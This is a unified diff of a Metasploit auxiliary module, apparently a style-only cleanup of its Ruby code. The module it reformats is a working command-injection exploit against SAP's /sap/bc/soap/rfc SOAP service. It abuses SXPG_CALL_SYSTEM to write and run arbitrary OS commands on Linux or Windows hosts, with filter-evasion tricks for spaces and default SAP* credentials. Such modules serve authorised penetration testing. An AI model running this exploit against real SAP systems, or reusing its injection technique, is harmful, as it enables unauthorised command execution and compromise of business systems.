@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,7 +18,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -25,10 +25,10 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection',
-      'Description' => %q{
+      'Description' => %q(
           This module makes use of the SXPG_CALL_SYSTEM Remote Function Call, through the
         use of the /sap/bc/soap/rfc SOAP service, to inject and execute OS commands.
-      },
+      ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ],
@@ -45,33 +45,34 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('CLIENT', [true, 'SAP Client', '001']),
         OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
         OptString.new('HttpPassword', [true, 'Password', '06071992']),
-        OptEnum.new('OS', [true, 'Target OS', "linux", ['linux','windows']]),
+        OptEnum.new('OS', [true, 'Target OS', "linux", ['linux', 'windows']]),
         OptString.new('CMD', [true, 'Command to run', "id"])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run_host(ip)
     payload = create_payload(1)
-    exec_command(ip,payload)
+    exec_command(ip, payload)
     payload = create_payload(2)
-    exec_command(ip,payload)
+    exec_command(ip, payload)
   end
 
   def create_payload(num)
     command = ""
     os = "ANYOS"
-    if datastore['OS'].downcase == "linux"
+    if datastore['OS'].casecmp("linux").zero?
       if num == 1
         command = "-o /tmp/pwned.txt -n pwnie" + "\n!"
-        command << datastore['CMD'].gsub(" ","\t")
+        command << datastore['CMD'].tr(" ", "\t")
         command << "\n"
       end
       command = "-ic /tmp/pwned.txt" if num == 2
-    elsif datastore['OS'].downcase == "windows"
+    elsif datastore['OS'].casecmp("windows").zero?
       if num == 1
         command = '-o c:\\\pwn.out -n pwnsap' + "\r\n!"
         space = "%programfiles:~10,1%"
-        command << datastore['CMD'].gsub(" ",space)
+        command << datastore['CMD'].gsub(" ", space)
       end
       command = '-ic c:\\\pwn.out' if num == 2
     end
@@ -86,34 +87,32 @@ class MetasploitModule < Msf::Auxiliary
     data << '</n1:SXPG_CALL_SYSTEM>' + "\r\n"
     data << '</env:Body>' + "\r\n"
     data << '</env:Envelope>' + "\r\n"
-    return data
+    data
   end
 
-  def exec_command(ip,data)
+  def exec_command(ip, data)
     print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_CALL_SYSTEM request")
     begin
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
-        'ctype' => 'text/xml; charset=UTF-8',
-        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        },
-        'encode_params' => false,
-        'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
-        }
-      })
-      if res and res.code != 500 and res.code != 200
+      res = send_request_cgi('uri' => '/sap/bc/soap/rfc',
+                             'method' => 'POST',
+                             'data' => data,
+                             'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+                             'ctype' => 'text/xml; charset=UTF-8',
+                             'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                             'headers' => {
+                               'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+                             },
+                             'encode_params' => false,
+                             'vars_get' => {
+                               'sap-client' => datastore['CLIENT'],
+                               'sap-language' => 'EN'
+                             })
+      if res && (res.code != 500) && (res.code != 200)
         print_error("[SAP] #{ip}:#{rport} - something went wrong!")
         return
-      elsif res and res.body =~ /faultstring/
+      elsif res && res.body =~ /faultstring/
         error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
-        0.upto(output.length-1) do |i|
+        0.upto(output.length - 1) do |i|
           print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
         end
         return
@@ -121,17 +120,17 @@ class MetasploitModule < Msf::Auxiliary
         print_status("[SAP] #{ip}:#{rport} - got response")
         output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
         result = []
-        0.upto(output.length-1) do |i|
+        0.upto(output.length - 1) do |i|
           if output[i] =~ /E[rR][rR]/ || output[i] =~ /---/ || output[i] =~ /for database \(/
-            #nothing
+            # nothing
           elsif output[i] =~ /unknown host/ || output[i] =~ /; \(see/ || output[i] =~ /returned with/
-            #nothing
+            # nothing
           elsif output[i] =~ /External program terminated with exit code/
-            #nothing
+            # nothing
           else
-            temp = output[i].gsub("&#62",">")
-            temp_ = temp.gsub("&#34","\"")
-            temp__ = temp_.gsub("&#39","'")
+            temp = output[i].gsub("&#62", ">")
+            temp_ = temp.gsub("&#34", "\"")
+            temp__ = temp_.gsub("&#39", "'")
             result << temp__ + "\n"
           end
         end
@@ -141,12 +140,12 @@ class MetasploitModule < Msf::Auxiliary
           'Prefix'  => "\n",
           'Postfix' => "\n",
           'Indent'  => 1,
-          'Columns' =>["Output"]
-          )
-        for i in 0..result.length/2-1
+          'Columns' => ["Output"]
+        )
+        for i in 0..result.length / 2 - 1
           saptbl << [result[i].chomp]
         end
-        print (saptbl.to_s)
+        print saptbl.to_s
         return
       else
         print_error("[SAP] #{ip}:#{rport} - Unknown error")
